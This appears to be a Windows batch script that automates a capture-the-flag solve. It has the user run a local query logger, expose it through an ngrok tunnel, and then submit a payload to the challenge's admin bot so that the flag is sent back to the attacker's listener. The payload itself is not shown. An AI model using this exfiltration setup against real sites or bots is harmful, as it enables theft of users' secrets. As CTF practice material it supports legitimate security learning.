@echo off
echo ===============================================
echo Ripple of Past Reverie - Flag Capture Script
echo ===============================================
echo.
echo IMPORTANT: You need to have the following running in separate terminals:
echo.
echo Terminal 1: python tools\query_logger.py --port 8000
echo Terminal 2: ngrok http 8000
echo.
echo Then run this script in Terminal 3
echo.
echo ===============================================
echo.

REM Check if ngrok URL is provided
if "%1"=="" (
    echo ERROR: Please provide your ngrok URL as an argument
    echo.
    echo Usage: GET_FLAG.bat "https://your-ngrok-url.ngrok-free.app"
    echo.
    echo Example: GET_FLAG.bat "https://fimbrillate-intersegmental-shelli.ngrok-free.dev"
    echo.
    pause
    exit /b 1
)

set NGROK_URL=%~1

echo [+] Using ngrok URL: %NGROK_URL%
echo.
echo [*] Submitting payload to bot...
echo.

python tools\submit_bot.py --ngrok-url "%NGROK_URL%" --both

echo.
echo ===============================================
echo [*] Payload submitted to BOTH instances!
echo [*] Check your query_logger.py terminal for the flag
echo [*] Look for a line like: "c = flag=amateursCTF{...}"
echo.
echo If you want to submit to only one instance:
echo   --instance 1  (a8hd38x0)
echo   --instance 2  (tfk6tz07, default)
echo ===============================================
pause
